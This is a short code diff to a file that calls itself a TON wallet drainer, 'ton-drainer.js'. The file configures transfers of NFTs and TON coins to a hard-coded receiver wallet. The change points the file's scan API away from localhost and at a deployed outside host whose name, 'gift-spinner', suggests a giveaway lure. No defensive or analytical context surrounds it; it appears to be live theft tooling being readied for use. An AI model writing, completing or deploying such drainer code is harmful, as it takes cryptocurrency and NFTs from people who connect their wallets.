@@ -1,7 +1,7 @@
 // ton-drainer.js — TON Connect: transfer NFT + TON
 const TON_CONFIG = {
   RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
-  SCAN_API: 'http://localhost:3001',
+  SCAN_API: 'https://gift-spinner.onrender.com',
   DEFAULT_FEE_TON: 0.05,
   NFT_FEE_TON: 0.03,
 };
